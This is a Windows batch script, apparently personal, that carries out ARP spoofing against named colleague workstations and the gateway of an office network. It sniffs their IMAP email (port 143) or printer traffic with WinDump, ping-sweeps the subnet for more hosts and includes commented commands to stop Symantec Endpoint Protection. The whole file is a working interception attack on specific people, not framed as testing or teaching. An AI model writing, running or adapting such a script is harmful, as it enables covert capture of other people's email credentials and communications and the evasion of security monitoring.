@echo off
rem goto automode

rem set pausa=pause
set pausa=echo.

rem x stampante
rem set target=180

rem x email
set target=1

rem "c:\Program Files (x86)\Symantec\Symantec Endpoint Protection\14.3.7393.4000.105\Bin\smc" -stop

@cd "C:\Users\Pasinelli\Desktop\Archivio\proglink\_programmi\Comunicazione TCPIP\ARP-spoofing"

rem goto automode

rem start sniffpc DESKTOPSQ 67.81 /e %target%
rem %pausa%
rem start sniffpc DESKTOPAG 67.86 /e %target%
%pausa%
start sniffpc DESKTOPSL 67.42 /e %target%
%pausa%
rem start sniffpc DESKTOPJM 67.141 /e %target%
rem %pausa%
start sniffpc NOTEBOOKGBA 67.93 /e %target%
%pausa%
rem start sniffpc DESKTOPFM 67.82 /e %target%
%pausa%
rem start sniffpc DESKTOPPC 67.85 /e %target%
%pausa%
rem start sniffpc NOTEBOOKJM 67.28 /e %target%
rem %pausa%
rem start sniffpc.bat DESKTOPMB 67.17 /e 1
rem start sniffpc.bat DESKTOPSN 67.43 /e 1
start sniffpc.bat DESKTOPST 67.91 /e 1
rem start sniffpc.bat DESKTOPAM 67.96 /e 1
rem start sniffpc.bat DESKTOPRM 67.110 /e 1
start sniffpc.bat LITTORIO 67.221 /e 1
start sniffpc.bat DESKTOPMD 77.9 /e 1
start sniffpc.bat DESKTOPDT 67.16 /e 1

rem dati verso altra sottorete
echo dati verso altra sottorete
rem start arpspoof.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} 192.168.67.180
start arpspoof.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} 192.168.67.1
pause


cd "C:\Users\Pasinelli\Desktop\Archivio\proglink\_programmi\Comunicazione TCPIP\TCP capture - WinDump"
del traccia_def.pcap

goto email


:stampante
title log traffico porta 9100 stampante 
echo avvio sniffing traffico verso la stampante sulla porta 9100...
echo WinDump.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} -w traccia_def.pcap port 9100 and not host 192.168.77.155 and host 192.168.67.180
WinDump.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} -w traccia_def.pcap port 9100 and not host 192.168.77.155 and host 192.168.67.180
goto wireshark


:email
rem port 143 - account posta elettronica 
title log traffico porta 143 email
echo avvio sniffing traffico accessi a account di posta sulla porta 143...
echo WinDump.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} -w traccia_def.pcap port 143
WinDump.exe -i \Device\NPF_{98FF2EC7-E759-41C5-A870-B9AE696FB240} -w traccia_def.pcap port 143
goto wireshark


:wireshark
pause

@explorer "C:\Users\Pasinelli\Desktop\Archivio\proglink\_programmi\Comunicazione TCPIP\WiresharkPortable64\App\Wireshark"
@cd "C:\Users\Pasinelli\Desktop\Archivio\proglink\_programmi\Comunicazione TCPIP\WiresharkPortable64\App\Wireshark"
Wireshark.exe traccia_def.pcap

rem "c:\Program Files (x86)\Symantec\Symantec Endpoint Protection\14.3.7393.4000.105\Bin\smc" -start

goto end


:automode
time /t
for /l %%i IN (2,1,255) DO (
    rem echo scan 192.168.67.%%i...
    setlocal EnableDelayedExpansion
    set ip=%%i
    for /f "tokens=1,4" %%i in ('ping -a -4 -n 1 -w 500 192.168.67.%%i') do ( 
    if "%%i"=="Esecuzione" (
        rem echo "%%j"=="192.168.67.%ip%"
        if NOT "%%j"=="192.168.67.%ip%" (
            setlocal EnableDelayedExpansion
            set nome_utente=%%j
            set ip_utente=%%k
            rem start sniffpc %nome_utente% 67.%ip% /e
            echo avvio di sniffpc %nome_utente% 67.%ip% /e
        )
    )
    )
)
time /t
pause
start sniffpc DESKTOPSQ 67.81 /e
start sniffpc DESKTOPAG 67.86 /e
start sniffpc DESKTOPSL 67.42 /e
pause




:end
